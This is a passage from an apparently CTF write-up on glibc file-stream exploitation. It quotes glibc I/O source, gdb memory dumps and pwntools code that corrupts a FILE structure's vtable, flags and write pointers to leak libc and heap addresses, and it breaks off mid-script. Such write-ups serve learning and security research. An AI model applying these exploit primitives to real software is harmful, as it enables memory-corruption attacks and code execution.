    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">)</span>
</code></pre></div>
  </div>
</div>
</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="efa9389a-9">
    <span>_IO_default_pbackfail</span>
    <span>...</span>
  </label>
  <input id="efa9389a-9" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_default_pbackfail</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span>
      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">c</span><span class="p">)</span>
    <span class="o">--</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="p">{</span>
      <span class="cm">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
	<span class="p">{</span>
	  <span class="cm">/* We need to keep the invariant that the main get area
</span><span class="cm">	     logically follows the backup area.  */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
	    <span class="p">{</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">save_for_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
	    <span class="p">}</span>
	  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
	    <span class="p">{</span>
        <span class="c1">// !! We should take this path cuz there is no save buffer plus we do not have the backup flag
</span><span class="c1"></span>	      <span class="cm">/* No backup buffer: allocate one. */</span>
	      <span class="cm">/* Use nshort buffer, if unused? (probably not)  FIXME */</span>
	      <span class="kt">int</span> <span class="n">backup_size</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
	      <span class="kt">char</span> <span class="o">*</span><span class="n">bbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">backup_size</span><span class="p">);</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">bbuf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="n">bbuf</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">+</span> <span class="n">backup_size</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_end</span><span class="p">;</span>
	    <span class="p">}</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="n">_IO_switch_to_backup_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	<span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="cm">/* Increase size of existing backup buffer. */</span>
	  <span class="n">size_t</span> <span class="n">new_size</span><span class="p">;</span>
	  <span class="n">size_t</span> <span class="n">old_size</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
	  <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
	  <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_size</span><span class="p">;</span>
	  <span class="n">new_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">-</span> <span class="n">old_size</span><span class="p">),</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">,</span>
		  <span class="n">old_size</span><span class="p">);</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">);</span>
	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">new_buf</span><span class="p">,</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">-</span> <span class="n">old_size</span><span class="p">),</span>
		    <span class="n">new_buf</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="o">*--</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_default_pbackfail</span><span class="p">)</span>
</code></pre></div>
  </div>
</div>


<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="428219e4-10">
    <span>fp state after the _IO_new_file_underflow</span>
    <span>...</span>
  </label>
  <input id="428219e4-10" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2588      0x0000559c0956050f
0x559c0955e2b0: 0x0000559c09560590      0x0000559c09560490
0x559c0955e2c0: 0x0000559c0955e480      0x0000559c0955e480
0x559c0955e2d0: 0x0000559c0955e480      0x0000559c0955e480
0x559c0955e2e0: 0x0000559c09560480      0x0000559c0955e480
0x559c0955e2f0: 0x0000559c09560510      0x0000559c0955e480
0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
0x559c0955e310: 0x0000000000000003      0x0000000000000000
0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
0x559c0955e340: 0x0000000000000000      0x0000000000000000
0x559c0955e350: 0x0000000000000000      0x0000000000000000
0x559c0955e360: 0x0000000000000000      0x0000000000000000
0x559c0955e370: 0x0000000000000000      0x00007f99db7bc460
0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
</code></pre>
  </div>
</div>

<p>Once we have the pointers at the right place, we can simply do some partial overwrites to the portion of the heap that contains a libc pointer. Indeed by taking a look at the memory at <code>fp-&gt;_IO_base_buffer &amp; ~0xff</code> (to avoid 4 bits bruteforce) we can that we can directly reach a libc pointer:</p>
<pre tabindex="0"><code>0x5649e8077400: 0x0000000000000000      0x0000000000000000
0x5649e8077410: 0x0000000000000000      0x0000000000000000
0x5649e8077420: 0x0000000000000000      0x0000000000000000
0x5649e8077430: 0x0000000000000000      0x0000000000000000
0x5649e8077440: 0x0000000000000000      0x0000000000000000
0x5649e8077450: 0x0000000000000000      0x0000000000000000
0x5649e8077460: 0x0000000000000000      0x0000000000000000
0x5649e8077470: 0x00007f4092dc3f60      0x0000000000002011
0x5649e8077480: 0x0000000000000000      0x0000000000000000
0x5649e8077490: 0x0000000000000000      0x0000000000000000
</code></pre><p>Then we have to actually doing the partial overwrite by corrupting certain pointers to leak this address with the help of <code>_IO_fflush</code>:

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="792f4368-11">
    <span>_IO_fflush</span>
    <span>...</span>
  </label>
  <input id="792f4368-11" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_fflush</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_IO_flush_all</span> <span class="p">();</span>
  <span class="k">else</span>
    <span class="p">{</span>
      <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
      <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">_IO_SYNC</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">?</span> <span class="nl">EOF</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_fflush</span><span class="p">)</span>
</code></pre></div>
  </div>
</div>
</p>
<p>It ends up calling <code>_IO_new_file_sync(fp)</code>:

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="3c3692bb-12">
    <span>_IO_new_file_sync</span>
    <span>...</span>
  </label>
  <input id="3c3692bb-12" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_new_file_sync</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">ssize_t</span> <span class="n">delta</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="cm">/*    char* ptr = cur_ptr(); */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span><span class="p">(</span><span class="n">fp</span><span class="p">))</span> <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="n">delta</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">off64_t</span> <span class="n">new_pos</span> <span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">delta</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">!=</span> <span class="p">(</span><span class="n">off64_t</span><span class="p">)</span> <span class="n">EOF</span><span class="p">)</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">ESPIPE</span><span class="p">)</span>
	<span class="p">;</span> <span class="cm">/* Ignore error from unseekable devices. */</span>
      <span class="k">else</span>
	<span class="n">retval</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="cm">/* FIXME: Cleanup - can this be shared? */</span>
  <span class="cm">/*    setg(base(), ptr, ptr); */</span>
  <span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_sync</span><span class="p">,</span> <span class="n">_IO_file_sync</span><span class="p">)</span>
</code></pre></div>
  </div>
</div>
</p>
<p>I already talked about the way we can gain arbitrary read with FSOP attack on <code>stdout</code> in <a
  class="gblog-markdown__link"
  href="../catastrophe"
  
  >this article</a
>. The way we will get a leak is almost the same, first we need to trigger the first condition in <code>_IO_new_file_sync</code> in such a way that <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> will trigger <code>_IO_do_flush(fp)</code>. Then <code>_IO_do_flush</code> triggers the classic code path I dump right below. I will not comment all of it, the only thing you have to remind is that given most of the buffers are already initialized to a valid heap address beyond the target we do not have to rewrite them, this way we will significantly reduce the amount of partial overwrite.</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="f7d5a6cb-13">
    <span>_IO_do_flush</span>
    <span>...</span>
  </label>
  <input id="f7d5a6cb-13" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _IO_do_flush(_f) \
</span><span class="cp">  ((_f)-&gt;_mode &lt;= 0							      \
</span><span class="cp">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
</span><span class="cp">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
</span><span class="cp">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
</span><span class="cp">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
</span><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
</span></code></pre></div>
  </div>
</div>

<p><strong>Condition</strong>:
<code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</code> &gt;= <code>sizeof(uint8_t* )</code>, <code>(_f)-&gt;_IO_write_base</code> == <code>target</code>.</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="74588d8a-14">
    <span>_IO_do_write</span>
    <span>...</span>
  </label>
  <input id="74588d8a-14" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
<span class="nf">_IO_new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span>
	  <span class="o">||</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">new_do_write</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">==</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_do_write</span><span class="p">,</span> <span class="n">_IO_do_write</span><span class="p">)</span>
</code></pre></div>
  </div>
</div>


<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="1e22ae62-15">
    <span>new_do_write</span>
    <span>...</span>
  </label>
  <input id="1e22ae62-15" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="n">size_t</span>
<span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
    <span class="cm">/* On a system without a proper O_APPEND implementation,
</span><span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is
</span><span class="cm">       not needed nor desirable for Unix- or Posix-like systems.
</span><span class="cm">       Instead, just indicate that offset (before and after) is
</span><span class="cm">       unpredictable. */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">off64_t</span> <span class="n">new_pos</span>
	<span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">=</span> <span class="n">_IO_adjust_column</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span>
		       <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
		       <span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_IO_buf_base</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
  </div>
</div>

<p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is the save buffer that has been allocated and switched in <code>_IO_default_pbackfail</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p>
<p>The leak phase gives for me something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># do_allocate</span>
<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
<span class="n">fflush</span><span class="p">()</span>

<span class="c1"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x60</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
<span class="n">fflush</span><span class="p">()</span>

<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span> <span class="o">|</span> <span class="mh">0x8000</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span>

<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x70</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>

<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x78</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">fileno</span><span class="p">)</span>
<span class="n">fflush</span><span class="p">()</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2160c0</span> <span class="o">+</span> <span class="mh">0x2d160</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="heap-leak">
        Heap leak
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#heap-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Heap leak" href="#heap-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To use the <code>_IO_obstack_jumps</code> technique, we have to craft a custom <code>obstack</code> structure on the heap (right on our filestream in fact) and thus we need to leak the heap to be able reference it. But given we already have a libc leak that&rsquo;s very easy, within the <code>main_arena</code> are stored some heap pointers, which means we just have to use the same <code>_IO_fflush</code> trick to flush the filestream and then leak a heap pointer stored in the <code>main_arena</code>. I wrote a function that leaks directly the right pointer from a given address:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">leak_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="s2">&#34;&#34;&#34;
</span><span class="s2">    We assume flags are right
</span><span class="s2">    &#34;&#34;&#34;</span>

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>
    
    <span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>

    <span class="n">fflush</span><span class="p">()</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">ret</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">[...]
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">leak_main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1ed5a0</span>

